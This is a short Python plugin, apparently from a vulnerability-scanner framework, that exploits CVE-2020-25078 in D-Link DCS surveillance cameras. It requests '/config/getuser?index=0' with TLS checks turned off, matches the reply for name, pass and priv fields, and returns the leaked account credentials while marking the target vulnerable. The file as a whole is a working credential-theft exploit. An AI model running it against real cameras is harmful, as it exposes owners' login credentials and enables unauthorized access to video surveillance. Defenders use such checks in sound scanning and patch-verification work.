#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  ['https://www.hackjie.com/docs/3281.html','https://mp.weixin.qq.com/s/rbSBjKvX_STXUjxY8TKOOA'],

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'D-Link DCS系列监控 账号密码信息泄露漏洞 CVE-2020-25078',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/config/getuser?index=0'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'name=.*?pass=.*?priv=.*?',res.text,re.S):
      ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret